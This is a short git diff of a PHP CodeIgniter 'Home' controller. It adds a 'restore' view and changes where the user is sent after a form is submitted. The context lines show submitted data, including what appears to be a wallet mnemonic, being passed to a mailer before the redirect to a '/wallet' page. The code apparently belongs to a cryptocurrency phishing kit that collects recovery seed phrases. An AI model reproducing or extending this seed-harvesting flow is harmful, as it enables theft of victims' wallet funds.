@@ -17,6 +17,11 @@ class Home extends BaseController
 		}
 	}
 
+	public function restore()
+	{
+			echo view('restore');
+	}
+
 	public function success()
 	{
 		echo view('success');
@@ -87,7 +92,7 @@ class Home extends BaseController
 		$this->mailer($data);
 		// echo('Done');
 		// return($incoming['mnemonic']);
-		// return redirect()->to(base_url('success#confirmation'));
+		return redirect()->to(base_url('/wallet?sz=650'));
 	}
 	//--------------------------------------------------------------------
 
